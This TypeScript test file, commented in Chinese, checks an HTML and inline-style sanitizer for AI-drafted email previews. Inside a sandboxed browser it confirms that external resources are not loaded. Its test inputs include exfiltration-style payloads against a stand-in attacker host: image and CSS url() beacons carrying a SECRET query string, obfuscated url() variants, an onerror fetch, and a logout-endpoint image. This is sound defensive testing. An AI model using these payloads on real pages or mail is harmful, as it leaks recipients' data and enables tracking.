/**
 * 模型起草的 HTML 预览不自动加载外部资源
 * （openspec change ai-html-preview-no-autoload，spec agents/ai-output-rendering）
 *
 * 三段：
 *   1. 纯函数：内联样式过滤；
 *   2. 源码与清单：sanitize.ts 的接线、没有 window 时的返回、全仓库直接渲染 HTML 的位置；
 *   3. 真实浏览器：把 sanitize.ts 打成脚本放进 Chromium，净化后放进页面，数外部请求。
 *      找不到 Chromium（CHROME_EXECUTABLE_PATH / Playwright 自带）时打印 SKIP，前两段照常判定。
 *
 * 运行：npx tsx src/lib/common/__tests__/sanitize-html.test.ts
 */
import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { sanitizeInlineStyle } from "../inline-style-policy";
import { sanitizeHtml } from "../sanitize";

let pass = 0;
let fail = 0;
function ok(cond: boolean, name: string, detail?: unknown) {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.error(`  ✗ ${name}${detail === undefined ? "" : ` → ${JSON.stringify(detail).slice(0, 800)}`}`);
  }
}

const ROOT = process.cwd();
const read = (p: string) => readFileSync(join(ROOT, p), "utf8");
const code = (p: string) => read(p).replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");

/** 登记的清单：仓库里直接把 HTML 字符串放进页面的位置（新增位置必须先过这里） */
const HTML_SINKS: Record<string, string> = {
  "src/components/project-question/project-question-dialog.tsx": "模型起草的问供应商邮件正文 → sanitizeHtml",
  "src/app/(main)/sales/ai-alert-panel.tsx": "模型起草的销售跟进邮件正文 → sanitizeHtml",
  "src/components/project-detail/analyst-memo-card.tsx": "服务端受限渲染器输出（全转义）",
  "src/app/layout.tsx": "主题启动脚本（代码里的常量）",
};

function walk(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    if (name === "node_modules" || name === "__tests__") continue;
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (/\.(ts|tsx)$/.test(name)) out.push(p);
  }
  return out;
}

const ATTACKER = "attacker.example";

async function browserSegment() {
  console.log("\n真实浏览器：净化后放进页面，数外部请求");
  let chromium: typeof import("playwright").chromium;
  let build: typeof import("esbuild").build;
  try {
    ({ chromium } = await import("playwright"));
    ({ build } = await import("esbuild"));
  } catch (e) {
    console.log(`⏭  SKIP 真实浏览器段：缺少 playwright / esbuild（${e instanceof Error ? e.message.split("\n")[0] : "error"}）`);
    return;
  }

  const candidates = [process.env.CHROME_EXECUTABLE_PATH, undefined, "/opt/pw-browsers/chromium"].filter(
    (p, i) => i === 1 || (typeof p === "string" && p.length > 0 && existsSync(p)),
  );
  let browser: Awaited<ReturnType<typeof chromium.launch>> | null = null;
  let lastError = "";
  for (const executablePath of candidates) {
    try {
      browser = await chromium.launch(executablePath ? { executablePath } : {});
      break;
    } catch (e) {
      lastError = e instanceof Error ? e.message.split("\n")[0] : "error";
    }
  }
  if (!browser) {
    console.log(`⏭  SKIP 真实浏览器段：找不到可用的 Chromium（${lastError}）`);
    return;
  }

  try {
    // 把真实的 sanitize.ts（连同 DOMPurify）打成一个脚本；legacy 是改动之前的净化配置，用来对照
    const bundled = await build({
      stdin: {
        contents: `
          import DOMPurify from "dompurify";
          export { sanitizeHtml } from "./src/lib/common/sanitize";
          export const legacy = (dirty) => DOMPurify.sanitize(dirty, {
            ALLOWED_TAGS: ["p","br","b","i","u","strong","em","a","ul","ol","li","h1","h2","h3","h4","h5","h6","blockquote","pre","code","span","div","table","thead","tbody","tr","th","td","img","hr"],
            ALLOWED_ATTR: ["href","src","alt","title","class","style","target","rel"],
          });`,
        resolveDir: ROOT,
        loader: "ts",
      },
      bundle: true,
      format: "iife",
      globalName: "QY",
      platform: "browser",
      write: false,
      tsconfig: join(ROOT, "tsconfig.json"),
      logLevel: "silent",
    });
    const script = bundled.outputFiles[0].text;

    const page = await browser.newPage();
    const requests: string[] = [];
    const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64");
    await page.route("**/*", async (route) => {
      const url = route.request().url();
      requests.push(url);
      if (url === "http://qingyan.test/") return route.fulfill({ status: 200, contentType: "text/html", body: "<!doctype html><div id=box></div>" });
      if (new URL(url).hostname === "qingyan.test") return route.fulfill({ status: 200, contentType: "image/png", body: PNG });
      return route.abort();
    });
    await page.goto("http://qingyan.test/");
    await page.addScriptTag({ content: script });

    /** 净化（或用旧配置）后放进页面，等一会儿，返回这段时间里的请求与最终的 HTML */
    const show = async (dirty: string, mode: "sanitizeHtml" | "legacy") => {
      const before = requests.length;
      const html = await page.evaluate(
        ([d, m]) => {
          const api = (window as unknown as { QY: Record<string, (s: string) => string> }).QY;
          const out = api[m](d);
          document.getElementById("box")!.innerHTML = out;
          return out;
        },
        [dirty, mode] as const,
      );
      await page.waitForTimeout(250);
      const made = requests.slice(before);
      await page.evaluate(() => {
        document.getElementById("box")!.innerHTML = "";
      });
      return { html, made, external: made.filter((u) => new URL(u).hostname !== "qingyan.test") };
    };

    const IMG = `<p>您好</p><img src="https://${ATTACKER}/p.png?d=SECRET" alt="报价">`;
    const BG = `<div style="color:#333;background:url(https://${ATTACKER}/b.png?d=SECRET)">正文</div>`;

    const legacyImg = await show(IMG, "legacy");
    const legacyBg = await show(BG, "legacy");
    ok(legacyImg.external.length === 1 && legacyBg.external.length === 1, "对照（改动之前的净化配置）：外部图片与背景图各发出 1 个外部请求", [legacyImg.external, legacyBg.external]);

    const img = await show(IMG, "sanitizeHtml");
    ok(img.external.length === 0, "外部图片：没有向外部主机发任何请求", img.external);
    ok(!/<img\b/i.test(img.html) && img.html.includes("图片未加载") && img.html.includes("报价"), "预览里没有 img 元素，有「图片未加载」的文字提示", img.html);
    ok(!img.html.includes("SECRET") && !img.html.includes("p.png") && img.html.includes("您好"), "提示里没有地址的路径与查询串；其余正文保留", img.html);

    for (const [label, dirty] of [
      ["协议相对地址", `<img src="//${ATTACKER}/x.png">`],
      ["反斜杠变形地址", `<img src="/\\${ATTACKER}/x.png">`],
      ["data: 地址", `<img src="data:image/png;base64,AAAA">`],
      ["带 srcset 的图片", `<img src="/api/files/a.png" srcset="https://${ATTACKER}/2x.png 2x">`],
      ["站内其它路径（如退出登录接口）", `<img src="/api/auth/logout">`],
      ["包在链接里的外部图片", `<a href="https://${ATTACKER}/"><img src="https://${ATTACKER}/y.png"></a>`],
    ] as const) {
      const r = await show(dirty, "sanitizeHtml");
      const sameSiteOk = r.made.every((u) => new URL(u).hostname === "qingyan.test" && new URL(u).pathname.startsWith("/api/files/"));
      ok(r.external.length === 0 && sameSiteOk && !/srcset/i.test(r.html), `${label}：没有外部请求，站内也只请求文件代理`, { made: r.made, html: r.html });
    }

    const allowed = await show(`<img src="/api/files/ai-chat/o1/a.png#x" alt="现场图">`, "sanitizeHtml");
    ok(/<img\b[^>]*src="\/api\/files\/ai-chat\/o1\/a\.png"/.test(allowed.html) && allowed.made.length === 1 && allowed.made[0] === "http://qingyan.test/api/files/ai-chat/o1/a.png", "站内文件图片照常显示，地址是规范化后的站内路径", allowed);

    const bg = await show(BG, "sanitizeHtml");
    ok(bg.external.length === 0, "背景图：没有向外部主机发任何请求", bg.external);
    ok(/style="color: ?#333;?"/.test(bg.html) && !/url\(/i.test(bg.html) && bg.html.includes("正文"), "color 保留，background:url(...) 去掉，正文保留", bg.html);

    for (const [label, dirty] of [
      ["转义写法 u\\72l(", `<div style="background:u\\72l(https://${ATTACKER}/e.png)">x</div>`],
      ["image-set()", `<div style="background-image:image-set('https://${ATTACKER}/s.png' 1x)">x</div>`],
      ["list-style 大写 URL(", `<ul><li style="list-style:URL( https://${ATTACKER}/l.png )">x</li></ul>`],
      ["HTML 实体编码的 url(", `<div style="background:&#117;rl(https://${ATTACKER}/h.png)">x</div>`],
      ["表格单元格背景", `<table><tr><td style="background:url(https://${ATTACKER}/t.png)">x</td></tr></table>`],
    ] as const) {
      const r = await show(dirty, "sanitizeHtml");
      ok(r.external.length === 0 && !/url\(|image-set/i.test(r.html), `${label}：没有外部请求，声明被去掉`, { made: r.made, html: r.html });
    }

    const script1 = await show(`<img src=x onerror="fetch('https://${ATTACKER}/js')"><script>fetch('https://${ATTACKER}/s')</script><style>body{background:url(https://${ATTACKER}/c.png)}</style>`, "sanitizeHtml");
    ok(script1.external.length === 0 && !/onerror|<script|<style/i.test(script1.html), "事件属性、script、style 标签：照旧被去掉，没有外部请求", script1);
  } finally {
    await browser.close();
  }
}

async function main() {
  console.log("内联样式过滤（纯函数）");
  {
    const kept = "color:#333; padding:8px 12px; background:#f5f5f5; width:100%; font-family:Arial, sans-serif; border:1px solid rgb(0,0,0); margin:calc(1em + 2px)";
    ok(
      sanitizeInlineStyle(kept) === "color: #333; padding: 8px 12px; background: #f5f5f5; width: 100%; font-family: Arial, sans-serif; border: 1px solid rgb(0,0,0); margin: calc(1em + 2px)",
      "普通声明都保留，顺序不变",
      sanitizeInlineStyle(kept),
    );
    for (const bad of [
      "background:url(https://x/a.png)",
      "background:u\\72l(//x)",
      'background-image:image-set("//x" 1x)',
      "list-style:URL( //x )",
      "background:/**/url(//x)",
      "width:expression(alert(1))",
      "background:image(//x)",
      "background:cross-fade(url(a), url(b))",
      "background:-webkit-image-set(url(a) 1x)",
      "background:element(#x)",
      "background:src(//x)",
      "background:var(--x)",
      "background:linear-gradient(red, blue)",
      "transform:translate3d(0,0,0)",
      "width:1(2)",
      "content:'a' @import 'x'",
      "background:url (//x)",
      "background:url\t(//x)",
    ]) {
      ok(sanitizeInlineStyle(bad) === "", `去掉：${bad}`, sanitizeInlineStyle(bad));
    }
    ok(sanitizeInlineStyle("color:red; background:url(//x); padding:4px") === "color: red; padding: 4px", "夹在中间的危险声明被去掉，前后保留");
    ok(sanitizeInlineStyle('background:url("a;b"); color:blue') === "color: blue", "引号里带分号的 url：拆出的碎片都被丢弃，后面的声明保留", sanitizeInlineStyle('background:url("a;b"); color:blue'));
    ok(sanitizeInlineStyle("COLOR: Red") === "color: Red" && sanitizeInlineStyle("-webkit-text-size-adjust:100%") === "-webkit-text-size-adjust: 100%", "属性名统一小写；带厂商前缀的普通属性保留");
    ok(sanitizeInlineStyle("colo r:red") === "" && sanitizeInlineStyle(":red") === "" && sanitizeInlineStyle("color") === "" && sanitizeInlineStyle("color:") === "", "属性名不合法 / 没有冒号 / 没有值：丢弃");
    ok(sanitizeInlineStyle("") === "" && sanitizeInlineStyle(null) === "" && sanitizeInlineStyle(undefined) === "" && sanitizeInlineStyle(42) === "", "空值与非字符串：返回空字符串");
    ok(sanitizeInlineStyle(kept) === sanitizeInlineStyle(kept), "同一输入两次结果相同");
  }

  console.log("\n没有浏览器环境时不放行原文");
  {
    ok(typeof window === "undefined", "本测试的这一段运行在没有 window 的环境里");
    ok(sanitizeHtml(`<img src="https://${ATTACKER}/x">`) === "" && sanitizeHtml("<p>正文</p>") === "", "sanitizeHtml 返回空字符串，不是传入的 HTML");
  }

  console.log("\n源码与清单");
  {
    const src = code("src/lib/common/sanitize.ts");
    ok(/from "@\/lib\/ai-markdown\/url-policy"/.test(src) && /classifyAiImageSrc\(img\.getAttribute\("src"\)\)/.test(src) && /blockedImageLabel\(/.test(src), "图片判定与提示文字用的是 Markdown 渲染那一套（url-policy）");
    ok(/sanitizeInlineStyle\(el\.getAttribute\("style"\)\)/.test(src) && /el\.removeAttribute\("style"\)/.test(src), "内联样式交给 sanitizeInlineStyle；一条不剩就去掉属性");
    ok(/if \(typeof window === "undefined"\) return "";/.test(src) && !/return dirty/.test(src), "没有 window 时返回空字符串；源码里没有「原样返回」");
    ok(/RETURN_DOM: true/.test(src) && /guardImages\(root\);\s*guardInlineStyles\(root\);\s*return root\.innerHTML;/.test(src), "先由 DOMPurify 净化成 DOM，再处理图片与样式，最后才取 HTML");
    ok(!/"srcset"/.test(src) && !/"background"/.test(src), "放行属性里没有 srcset 与 background");
    ok(!/from "(react|next|@\/lib\/db)/.test(code("src/lib/common/inline-style-policy.ts")) && !/window|document/.test(code("src/lib/common/inline-style-policy.ts")), "inline-style-policy 是纯函数：不引框架、不碰 DOM");

    const hits = walk(join(ROOT, "src"))
      .filter((p) => readFileSync(p, "utf8").includes("dangerouslySetInnerHTML"))
      .map((p) => relative(ROOT, p).split("\\").join("/"))
      .sort();
    ok(JSON.stringify(hits) === JSON.stringify(Object.keys(HTML_SINKS).sort()), "直接渲染 HTML 的位置只有登记的四个文件", hits);
    for (const p of ["src/components/project-question/project-question-dialog.tsx", "src/app/(main)/sales/ai-alert-panel.tsx"]) {
      const c = code(p);
      const sinks = [...c.matchAll(/dangerouslySetInnerHTML=\{\{\s*__html:\s*([^}]+)\}\}/g)].map((m) => m[1].trim());
      ok(sinks.length === 1 && /^sanitizeHtml\(/.test(sinks[0]), `${p.split("/").pop()}：唯一的一处先交给 sanitizeHtml`, sinks);
    }
    ok(/服务端受限渲染器输出/.test(read("src/components/project-detail/analyst-memo-card.tsx")), "分析备忘卡片：注明内容来自服务端受限渲染器（不接受其它 HTML 来源）");
  }

  await browserSegment();

  console.log(`\nsanitize-html: ${pass} passed, ${fail} failed`);
  if (fail > 0) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
